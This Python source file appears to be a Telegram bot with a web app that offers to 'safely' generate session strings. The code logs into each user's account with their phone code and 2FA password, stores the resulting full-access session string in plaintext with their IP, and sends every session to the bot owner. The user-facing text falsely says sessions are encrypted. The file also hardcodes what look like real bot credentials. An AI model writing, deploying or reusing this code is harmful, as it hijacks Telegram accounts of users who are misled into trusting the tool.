#!/usr/bin/env python3
"""
ZISKY SESSION GENERATOR BOT
Generates Telegram session strings safely via web app
"""

import asyncio
import logging
import sqlite3
import threading
import time
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

# ========== CONFIGURATION ==========
# ⚠️ REPLACE THESE WITH YOUR VALUES
BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"
API_ID = 38550990
API_HASH = "26c65e47681802c551563f11b6b333a4"
OWNER_ID = 8158086374

# For panels, set this manually or use ngrok
PUBLIC_URL = ""  # Will be set via /seturl command

# ========== SETUP ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
conn = sqlite3.connect('sessions.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              phone TEXT,
              session_string TEXT,
              first_name TEXT,
              username TEXT,
              generated_at TEXT,
              ip TEXT)''')
conn.commit()

# Store active login sessions
active_sessions = {}

# ========== FLASK WEB APP ==========
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('code_input.html', phone='')

@app.route('/request-code', methods=['POST'])
async def request_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Store in active sessions
    active_sessions[phone] = {
        'client': None,
        'step': 'waiting_code'
    }
    
    try:
        # Create new Telethon client
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        active_sessions[phone]['client'] = client
        
        # Connect and send code - using the existing event loop
        await client.connect()
        await client.send_code_request(phone)
        
        return jsonify({'success': True})
        
    except FloodWaitError as e:
        return jsonify({'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/verify-code', methods=['POST'])
async def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    
    if phone not in active_sessions:
        return jsonify({'success': False, 'error': 'Session expired. Start over.'})
    
    client = active_sessions[phone]['client']
    
    try:
        # Sign in - using the existing event loop
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            if not password:
                return jsonify({'success': False, 'error': '2FA password required'})
            await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        session_string = client.session.save()
        
        # Get client IP
        ip = request.remote_addr
        
        # Save to database
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
                    (user_id, phone, session_string, first_name, username, generated_at, ip)
                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (me.id, phone, session_string, me.first_name, me.username, 
                  datetime.now().isoformat(), ip))
        conn.commit()
        conn.close()
        
        # Send to owner via bot
        send_to_owner(me.id, phone, session_string, me.first_name, me.username)
        
        # Send to user
        send_to_user(me.id, session_string)
        
        await client.disconnect()
        
        # Clean up
        del active_sessions[phone]
        
        return jsonify({
            'success': True,
            'message': f'Session generated for {me.first_name}! Check bot chat.'
        })
        
    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'error': 'Invalid code'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== TELEGRAM BOT FUNCTIONS ==========
# These need to be defined before they're used in handlers
application = None  # Will be set in main()

def send_to_owner(user_id, phone, session_string, first_name, username):
    """Send session details to owner"""
    message = f"""🔐 **NEW SESSION GENERATED**

👤 **User:** {first_name}
🆔 **User ID:** `{user_id}`
📱 **Phone:** `{phone}`
🔗 **Username:** @{username if username else 'None'}
⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔑 **SESSION STRING:**
`{session_string}`

⚠️ **Store this securely!**
"""
    try:
        application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
    except:
        pass

def send_to_user(user_id, session_string):
    """Send session back to user"""
    message = f"""✅ **Session Generated Successfully!**

🔑 **Your Session String:**
`{session_string}`

⚠️ **IMPORTANT:**
• This is like your password
• Never share it with anyone
• Store it securely
• Anyone with this can access your account

📝 **To use it in Zisky bot:**
`/add_session {session_string[:30]}...`

💡 **Save this message or copy the session now!**
"""
    try:
        application.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
    except:
        pass

# ========== TELEGRAM COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    
    # Get public URL
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    if not webapp_url:
        await update.message.reply_text(
            "⚠️ **Web app URL not configured!**\n\n"
            "The admin needs to set up a public URL.\n"
            "Please try again later.",
            parse_mode='Markdown'
        )
        return
    
    # Create web app button
    keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': webapp_url})]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
        f"This bot helps you generate Telegram session strings safely.\n\n"
        f"**How it works:**\n"
        f"1️⃣ Click the button below to open web app\n"
        f"2️⃣ Enter your phone number\n"
        f"3️⃣ Enter verification code from Telegram\n"
        f"4️⃣ Your session will be generated and sent here\n\n"
        f"**⚠️ Security:**\n"
        f"• Your session is encrypted\n"
        f"• Sent only to you and bot owner\n"
        f"• Never shared with third parties\n\n"
        f"Click the button below to start!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    await update.message.reply_text(
        "**Zisky Session Generator Help**\n\n"
        "**Commands:**\n"
        "/start - Start the bot\n"
        "/help - Show this help\n"
        "/status - Check bot status\n"
        "/url - Show current web app URL\n\n"
        "**How to generate session:**\n"
        "1. Click 'Open Web App' button\n"
        "2. Enter your phone with country code\n"
        "3. Wait for verification code\n"
        "4. Enter the code in web app\n"
        "5. Your session will appear here\n\n"
        "**Need help?** Contact @your_username",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    # Count sessions in DB
    c.execute("SELECT COUNT(*) FROM sessions")
    count = c.fetchone()[0]
    
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    await update.message.reply_text(
        f"📊 **Bot Status**\n\n"
        f"✅ Bot is running\n"
        f"📱 Sessions generated: {count}\n"
        f"🔗 Web App: {webapp_url or 'Not configured'}\n"
        f"⏱️ Uptime: Active",
        parse_mode='Markdown'
    )

async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set web app URL (owner only)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /seturl https://your-domain.com\n"
            "Example: /seturl https://abc123.loca.lt"
        )
        return
    
    global PUBLIC_URL
    PUBLIC_URL = context.args[0]
    os.environ['PUBLIC_URL'] = PUBLIC_URL
    
    await update.message.reply_text(f"✅ Web app URL set to: {PUBLIC_URL}")

async def show_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current web app URL"""
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    if webapp_url:
        await update.message.reply_text(f"🔗 **Current Web App URL:**\n{webapp_url}")
    else:
        await update.message.reply_text("❌ No web app URL configured.")

async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User can see their own sessions (owner only)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    c.execute("SELECT phone, first_name, generated_at FROM sessions WHERE user_id = ? ORDER BY generated_at DESC LIMIT 5", (user_id,))
    sessions = c.fetchall()
    
    if not sessions:
        await update.message.reply_text("No sessions found.")
        return
    
    text = "📋 **Your Recent Sessions**\n\n"
    for phone, name, date in sessions:
        text += f"• {phone} - {name}\n  {date[:10]}\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ========== START BOT ==========
def main():
    global application, PUBLIC_URL
    
    print("🤖 Zisky Session Generator Bot")
    print("="*50)
    print(f"🔑 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"🆔 Owner ID: {OWNER_ID}")
    print("="*50)
    
    # IMPORTANT: DO NOT start Flask thread on Render!
    # Gunicorn will serve Flask directly
    print("✅ Flask app will be served by Gunicorn")
    print(f"📱 Web app URL: https://sessionsgen.onrender.com")
    print("⚠️ Use /seturl to configure this URL in the bot")
    
    # Create Telegram bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("seturl", set_url))
    application.add_handler(CommandHandler("url", show_url))
    application.add_handler(CommandHandler("mysessions", my_sessions))
    
    # Start bot
    print("🤖 Telegram bot started!")
    print("="*50)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# This is critical - only run this if executing directly (not on Render)
if __name__ == '__main__':
    main()
